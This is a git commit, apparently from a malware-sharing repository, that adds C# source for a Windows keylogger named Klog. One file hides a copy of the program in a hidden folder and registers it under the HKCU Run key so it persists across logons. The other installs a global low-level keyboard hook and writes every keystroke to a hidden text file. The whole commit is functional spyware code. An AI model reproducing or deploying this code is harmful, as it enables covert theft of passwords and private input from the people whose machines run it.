686c167b61fe44d45ee1c0867e2a70b5e07f9cb6
Felloyuuka <123282337+FelloBoiYuuka@users.noreply.github.com>
2025-03-10 21:08:28 -0600

    By @Malwarestudio

---
+++ Source codes/Klog/Klog/Save.cs
@@ -0,0 +1,31 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using Microsoft.Win32;
+
+namespace Klog
+{
+    public partial class Save : Core
+    {
+        public void SetUP()
+        {
+            if (!Directory.Exists(hidden_dir))
+            {
+                DirectoryInfo create_dir = Directory.CreateDirectory(hidden_dir);
+                create_dir.Attributes = FileAttributes.Directory | FileAttributes.Hidden; 
+            }
+            if (File.Exists(new_file))
+                return;
+
+            File.Copy(cur_file, new_file);
+            File.SetAttributes(new_file, FileAttributes.Hidden);
+
+            RegistryKey reg_key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
+
+            reg_key.SetValue("", new_file, RegistryValueKind.String);
+        }
+    }
+}
---
+++ Source codes/Klog/Klog/Test_Class.cs
@@ -0,0 +1,79 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using System.Threading;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.IO;
+
+namespace Klog
+{
+    public partial class Test_Class : Core
+    {
+        [DllImport("user32.dll")]
+        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);
+        [DllImport("user32.dll")]
+        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr LoadLibrary(string lpFileName);
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Keys vKeys);
+
+        private const int KEY_PRESSED = 0x8000;
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        const int WH_KEYBOARD_LL = 13; // Number of global LowLevel- hook on the keyboard
+
+        private LowLevelKeyboardProc _proc = hookProc;
+
+        private static IntPtr hhook = IntPtr.Zero;
+
+        public static string key_log_file = hidden_dir + @"\kdata.txt";
+
+        public void SetHook()
+        {
+            IntPtr hInstance = LoadLibrary("User32");
+            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);
+        }   
+        public static IntPtr hookProc(int code, IntPtr wParam, IntPtr lParam)
+        {
+            if (code < 0)
+                return CallNextHookEx(IntPtr.Zero, code, (int)wParam, lParam);
+
+            var get_char = Enum.GetValues(typeof(Keys));
+            string skeyn;
+            bool keyp;
+
+            if (!File.Exists(key_log_file))
+            {
+                try
+                {
+                    File.Create(key_log_file).Close();
+                    File.SetAttributes(key_log_file, FileAttributes.Hidden);
+                }
+                catch(Exception ex) { MessageBox.Show("Could not create file: " + ex.Message, "Exception", MessageBoxButtons.OK, MessageBoxIcon.Error); }
+            }
+
+            TextWriter twriter = new StreamWriter(key_log_file, true);
+            foreach (Keys keyn in get_char)
+            {
+                keyp = Convert.ToBoolean(GetAsyncKeyState(keyn) & KEY_PRESSED);
+
+                skeyn = keyn.ToString();
+
+                if (keyp)
+                {
+                    if (!char.IsLetterOrDigit((char)keyn))
+                        skeyn = " [ " + keyn.ToString() + " ] ";
+                    twriter.Write(skeyn);
+                }
+            }
+            twriter.Close();
+
+            return CallNextHookEx(IntPtr.Zero, code, (int)wParam, lParam);
+        }
+    }
+}
